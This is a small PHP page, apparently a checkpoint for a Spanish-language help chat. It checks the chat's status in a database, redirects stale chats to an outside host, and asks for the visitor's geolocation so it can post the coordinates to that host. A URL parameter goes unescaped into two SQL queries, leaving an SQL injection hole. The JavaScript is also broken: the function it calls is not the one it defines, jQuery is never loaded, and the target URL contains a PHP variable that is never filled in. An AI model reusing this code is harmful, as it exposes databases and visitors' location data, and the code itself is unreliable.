<?php 
//checkpoint
include('conf.php'); 
include_once 'customFunctions.php';
$general=$_GET["gr"];
$db = mysqli_connect($host,$username,$pass,$database);
//mysql_select_db($database,$db);
$result = mysqli_query($db,"SELECT status from chatstat where gr = '$general' LIMIT 1");
if (mysqli_num_rows($result)){ 
$status=mysqli_result($result,0,"status");
}
if ($status === 0 || empty($status)) {
	header("Location: https://app-quam.net/aateayuda.com/$general/");
	} else {}

	$result2 = mysqli_query($db,"SELECT date from chat where general = '$general' order by date desc LIMIT 1");
if (mysqli_num_rows($result2)){ 
$fecha=mysqli_result($result2,0,"date");
}
$d10=date("Y-m-d H:i:s",time()-86400);
$today = strtotime($d10);
$last = strtotime($fecha);

if ($last < $today) {
		header("Location: https://app-quam.net/aateayuda.com/$general/");
	} else {}

 ?>
<html>
<head>
<link href="https://app-quam.net/aateayuda.com/chatstyle.css" rel="stylesheet" type="text/css" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<script type="text/javascript">
if (navigator.geolocation) {
 navigator.geolocation.getCurrentPosition(success, error);
} else {
 error('not supported');
 alert('Error, no pudimos recibir su ubicacion');
}

function successFunction(position) {
   var lat = position.coords.latitude;
   var longi = position.coords.longitude;

   $.ajax({
      type: 'POST',
      data: { latitude : lat, longitude : longi },
      url: 'https://app-quam.net/aateayuda.com/$gr'
      //... passing on server
   });
   alert ('Gracias, hemos recibido su ubicacion');
}

</script>
</head>
<body>

</body>
</html>
